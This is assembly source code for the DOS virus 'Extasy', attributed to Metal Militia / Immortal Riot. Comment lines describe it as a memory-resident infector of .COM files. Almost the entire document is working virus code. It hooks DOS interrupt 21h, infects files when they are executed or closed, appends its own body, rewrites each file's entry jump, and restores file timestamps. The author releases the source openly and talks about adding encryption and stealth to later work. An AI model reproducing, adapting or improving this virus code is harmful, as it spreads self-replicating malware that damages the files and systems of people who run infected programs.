; Virusname: Extasy
; Origin: Sweden
; Author: Metal Militia
 
; This virus can be found with any anti-virus program, since it's been
; around for a while now. (SCAN/TB-SCAN/F-PROT/SOLOMON that is..)
;
; It's a resident .COM infector, without any encryption or stealth
; capabilities. It infects when you execute (4bh) or closes (3eh).
; This virus looks pretty much like RAVAGE, since it's pretty much
; alike	except for that RAVAGE infects .EXE files too.
;
; I stopped with this virus since it's so totally buggy that you'll find
; it almost at once. This is the reason why i give you the source code.
; In my later resident things, there will be such things as encryption,
; stealth etc. i think..
 

          .model  tiny
          .code
          .radix  16
          .code

  viruslength     =       heap - _small
  startload       =       90 * 4

  _small:
          call    relative
  oldheader       dw      020cdh
                  dw      0bh dup (0)
  relative:
          pop     bp
          push    ds
          push    es
          xor     ax,ax
          mov     ds,ax
          mov     es,ax
          mov     di,startload
          cmp     word ptr ds:[di+25],di
          jz      exit_small

          lea     si,[bp-3]
          mov     cx,viruslength
          db      2Eh
          rep     movsb

          mov     di,offset old21 + startload
          mov     si,21*4
          push    si
          movsw
          movsw
          pop     di
          mov     ax,offset int21 + startload
          stosw
          xchg    ax,cx
          stosw

  exit_small:
          pop     es
          pop     ds

          or      sp,sp
          jnp     returnCOM

  returnGNU:
  returnCOM:
          mov     di,100
          push    di
          mov     si,bp
          movsw
          movsb
          ret

  infect:
          push    ax
          push    bx
          push    cx
          push    dx
          push    si
          push    di
          push    ds
          push    es

          mov     ax,3d02
          int     21
          xchg    ax,bx

          push    cs
          pop     ds
          push    cs
          pop     es

          mov     ax,5700h
          int     21h

          push    cx
          push    dx

          mov     si,offset oldheader+startload

          mov     ah,3f
          mov     cx,18
          push    cx
          mov     dx,si
          int     21

          cmp     ax,cx
          jnz     go_already_infected

          mov     di,offset target + startload
          push    di
          rep     movsb
          pop     di

          mov     ax,4202
          cwd
          int     21

          cmp     ds:[di],'ZM'
          jz      infectNOT
          cmp     ds:[di],'MZ'
          jz      infectNOT

          sub     ax,3
          mov     byte ptr ds:[di],0e9
          mov     ds:[di+1],ax

          sub     ax,viruslength
          cmp     ds:[si-17],ax
          jnz     finishinfect
 
  go_already_infected:
          pop     cx
          jmp     short already_infected

          db      "EXTASY!"
          db      "(c) Metal Militia / Immortal Riot"

  int21:
          cmp     ax,4b00
          jz      kewl
          cmp     ax,3e00
          jnz     oops
          mov     ah,45
          int     21
          jmp     kewl

  oops:
          jmp     chain

  infectNOT:
          jmp     go_already_infected

  kewl:
          jmp     infect

  finishinfect:
          mov     cx,viruslength
          mov     dx,startload
          mov     ah,40
          int     21

          mov     ax,4200
          xor     cx,cx
          cwd
          int     21

          mov     ah,40
          mov     dx,di
          pop     cx
          int     21
  already_infected:
          pop    dx
          pop    cx

          mov     ax,5701h
          int     21h

          mov     ah,3e
          int     21
  exitinfect:
          pop     es
          pop     ds
          pop     di
          pop     si
          pop     dx
          pop     cx
          pop     bx
          pop     ax
  chain:
          db      0ea
  heap:
  old21   dw      ?, ?
  target  dw      0ch dup (?)

  endheap:
          end     _small